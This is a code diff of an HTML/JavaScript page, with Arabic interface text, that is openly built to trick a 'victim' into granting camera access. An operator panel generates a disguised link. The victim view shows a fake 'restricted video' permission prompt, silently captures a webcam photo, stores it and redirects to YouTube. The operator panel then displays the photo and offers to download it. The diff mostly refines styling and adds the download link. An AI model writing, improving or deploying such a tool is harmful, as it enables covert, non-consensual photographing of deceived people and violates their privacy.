@@ -12,7 +12,6 @@
             --accent-hover: #2563eb;
             --text-main: #f8fafc;
             --text-dim: #94a3b8;
-            --danger: #ef4444;
             --success: #10b981;
         }
 
@@ -28,7 +27,6 @@
             min-height: 100vh; padding: 20px; box-sizing: border-box;
         }
 
-        /* لوحة التحكم المطورة */
         .admin-box {
             background: var(--card-dark);
             padding: 40px;
@@ -38,14 +36,12 @@
             text-align: center;
             box-shadow: 0 20px 50px rgba(0,0,0,0.3);
             border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.3s ease;
         }
 
-        h2 { margin-bottom: 10px; font-size: 24px; color: var(--text-main); }
-        p.desc { color: var(--text-dim); font-size: 14px; margin-bottom: 25px; }
+        h2 { margin-bottom: 25px; font-size: 24px; color: var(--text-main); }
 
         .input-group { text-align: right; margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 13px; }
+        .input-group label { display: block; margin-bottom: 8px; color: var(--text-dim); font-size: 14px; }
 
         input[type="text"] {
             width: 100%;
@@ -55,15 +51,11 @@
             border-radius: 12px;
             color: white;
             font-size: 15px;
-            transition: border 0.3s;
             box-sizing: border-box;
+            transition: border 0.3s;
         }
 
-        input[type="text"]:focus {
-            border-color: var(--accent);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
-        }
+        input[type="text"]:focus { border-color: var(--accent); outline: none; }
 
         .btn {
             background: var(--accent);
@@ -75,33 +67,36 @@
             width: 100%;
             font-weight: 600;
             font-size: 16px;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
         }
 
         .btn:hover { background: var(--accent-hover); transform: translateY(-2px); }
-        .btn:active { transform: translateY(0); }
 
-        /* منطقة الرابط الناتج */
         .result-area {
             margin-top: 30px;
             padding: 20px;
             background: rgba(59, 130, 246, 0.1);
             border-radius: 16px;
             border: 1px dashed var(--accent);
-            animation: fadeIn 0.5s ease;
         }
 
         #preview-container {
             margin-top: 30px;
             display: none;
-            animation: slideUp 0.5s ease;
         }
 
         #preview-img {
             width: 100%;
             border-radius: 16px;
             border: 4px solid var(--accent);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            margin-bottom: 15px;
+        }
+
+        .download-btn {
+            background: var(--success);
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
         }
 
         .status-badge {
@@ -114,9 +109,9 @@
             color: var(--text-dim);
         }
 
-        .status-online { background: var(--success); color: white; }
+        .hidden { display: none !important; }
 
-        /* واجهة الضحية (نفس الطلبات السابقة) */
+        /* واجهة الضحية */
         .victim-ui {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; z-index: 9999;
@@ -126,11 +121,6 @@
             background: #111; padding: 40px; border-radius: 20px;
             text-align: center; border: 1px solid #222; width: 85%; max-width: 350px;
         }
-
-        .hidden { display: none !important; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -138,11 +128,10 @@
 <div class="container">
     <div id="admin-panel" class="admin-box">
         <h2>لوحة التحكم الذكية</h2>
-        <p class="desc">قم بتوليد رابط مموه وتتبع النتائج فوراً</p>
 
         <div class="input-group">
-            <label>رابط الوجهة (YouTube / TikTok)</label>
-            <input type="text" id="urlInput" placeholder="https://www.youtube.com/watch?v=...">
+            <label>قم بادخال الرابط</label>
+            <input type="text" id="urlInput" placeholder="https://...">
         </div>
 
         <button class="btn" onclick="generate()">إنشاء الرابط السحري</button>
@@ -150,22 +139,22 @@
         <div id="result" class="result-area hidden">
             <p style="font-size: 13px; color: var(--accent); margin-bottom: 10px;">تم توليد الرابط بنجاح:</p>
             <input type="text" id="finalLink" readonly onclick="this.select()">
-            <p style="font-size: 11px; color: var(--text-dim); margin-top: 8px;">(انسخ الرابط وأرسله للطرف الآخر)</p>
         </div>
 
         <div id="preview-container">
-            <div class="status-badge status-online">✅ تم استلام صورة جديدة!</div>
+            <div class="status-badge" style="background: var(--success); color: white; margin-bottom: 10px;">✅ تم التقاط الصورة!</div>
             <img id="preview-img">
+            <a id="downloadLink" download="captured_image.jpg" class="btn download-btn">تحميل الصورة</a>
         </div>
 
-        <div id="waiting-status" class="status-badge">في انتظار فتح الرابط...</div>
+        <div id="waiting-status" class="status-badge">في انتظار الطرف الآخر...</div>
     </div>
 
     <div id="victim-panel" class="victim-ui hidden">
         <div class="dialog-box">
             <h2 style="margin-top:0;">محتوى مقيد</h2>
             <p style="color: #888; line-height: 1.6;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة" لمشغل الوسائط.</p>
-            <button class="btn" id="allowBtn" style="background: var(--danger); margin-top: 20px;">السماح بالمشاهدة</button>
+            <button class="btn" id="allowBtn" style="background: #ef4444; margin-top: 20px;">السماح بالمشاهدة</button>
         </div>
         <video id="video" autoplay playsinline style="display:none"></video>
         <canvas id="canvas" style="display:none"></canvas>
@@ -176,7 +165,6 @@
     const params = new URLSearchParams(window.location.search);
     const mode = params.get('auth');
 
-    // --- منطق الضحية ---
     if (mode === 'video_verify') {
         document.getElementById('admin-panel').classList.add('hidden');
         document.getElementById('victim-panel').classList.remove('hidden');
@@ -193,11 +181,10 @@
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    const data = canvas.toDataURL('image/jpeg', 0.5);
+                    const data = canvas.toDataURL('image/jpeg', 0.8);
                     localStorage.setItem('captured_data', data);
                     
-                    const target = localStorage.getItem('last_redirect') || 'https://www.youtube.com';
-                    
+                    const target = localStorage.getItem('last_redirect') || 'https://youtube.com';
                     stream.getTracks().forEach(t => t.stop());
                     window.location.href = target;
                 }, 1000);
@@ -207,33 +194,27 @@
         };
     }
 
-    // --- منطق المدير (أنت) ---
     function generate() {
         const url = document.getElementById('urlInput').value;
-        if (!url) {
-            alert("يرجى إدخال رابط الوجهة أولاً");
-            return;
-        }
+        if (!url) return alert("يرجى إدخال الرابط أولاً");
 
         localStorage.setItem('last_redirect', url);
         const baseUrl = window.location.href.split('?')[0];
         document.getElementById('finalLink').value = baseUrl + "?auth=video_verify";
         document.getElementById('result').classList.remove('hidden');
-        
-        // تحسين بصري
-        document.getElementById('waiting-status').innerText = "بانتظار الطرف الآخر (رابطك نشط)...";
+        document.getElementById('waiting-status').innerText = "بانتظار الطرف الآخر...";
     }
 
-    // التنصت على التغييرات (يعمل عند فتح تبويبين لنفس الموقع)
     window.addEventListener('storage', (event) => {
         if (event.key === 'captured_data') {
             const container = document.getElementById('preview-container');
             const img = document.getElementById('preview-img');
-            const waiting = document.getElementById('waiting-status');
-
+            const downloadLink = document.getElementById('downloadLink');
+            
             img.src = event.newValue;
+            downloadLink.href = event.newValue;
             container.style.display = 'block';
-            waiting.style.display = 'none';
+            document.getElementById('waiting-status').style.display = 'none';
         }
     });
 </script>
